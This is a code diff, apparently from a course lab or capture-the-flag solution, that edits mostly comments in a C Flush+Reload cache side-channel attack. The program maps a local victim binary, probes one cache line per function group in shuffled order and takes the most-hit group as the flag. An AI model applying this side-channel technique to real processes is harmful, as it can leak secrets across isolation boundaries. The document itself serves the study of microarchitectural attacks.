@@ -41,12 +41,17 @@ int main(void)
     // g0 in 0x2000 -> b0 | 010_0000_00 | 00_0000
     // g1 in 0x2040 -> b0 | 010_0000_01 | 00_0000
     // g2 in 0x2080 -> b0 | 010_0000_10 | 00_0000
-    // so each function in different sets
+    // so each group of function in different sets
 
     // g8r0 in 0x2200 -> b0 | 010_0010_00 | 00_0000
     // g8r21 in 0x17200 -> b10 | 111_0010_00 | 00_0000
-    // rounds are 0x1000 apart = 64 sets apart (different set each round)
-    // map the victim binary so we share its code pages (like part1's file)
+    // rounds are 0x1000 apart 
+    // different set each roudn
+    // but there is wrap around every8?
+    // also, victim code keeps accessing entry on a loop
+    // so just check entry - just check _r0
+
+    // map vic binary
     int fd = open("./victim", O_RDONLY);
     if (fd < 0)
     {
@@ -54,7 +59,7 @@ int main(void)
         return 1;
     }
     struct stat st;
-    fstat(fd, &st);
+    fstat(fd, &st); // fill fd metadata into st
     uint8_t *vic = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
     if (vic == MAP_FAILED)
     {
@@ -62,12 +67,13 @@ int main(void)
         return 1;
     }
 
-    // one probe line per group: g_i_r0 sits at ENTRY + i*STRIDE, its own set
-    ADDR_PTR addr[NGROUPS];
+    // one probe line per group gi_r0 sits at ENTRY + i*STRIDE, its own set
+    ADDR_PTR addr[NGROUPS]; // 22 groups
     for (int i = 0; i < NGROUPS; i++)
-        addr[i] = (ADDR_PTR)(vic + ENTRY + i * STRIDE);
+        addr[i] = (ADDR_PTR)(vic + ENTRY + i * STRIDE); 
+        // vic has pointer to start of victim too
 
-    // shuffle probe order once so the prefetcher can't predict us
+    // fisher yates shuffle again
     srand(time(NULL) ^ getpid());
     int order[NGROUPS];
     for (int i = 0; i < NGROUPS; i++)
@@ -80,7 +86,7 @@ int main(void)
         order[j] = t;
     }
 
-    // flush+reload: only the group the victim runs stays hot -> reloads fast
+    // flush+reload fast is victim flag
     int hits[NGROUPS] = {0};
     for (int r = 0; r < ROUNDS; r++)
     {
@@ -94,7 +100,7 @@ int main(void)
         }
     }
 
-    // most-hit group is the flag
+    // find max
     int best = 0;
     for (int i = 0; i < NGROUPS; i++)
         if (hits[i] > best)
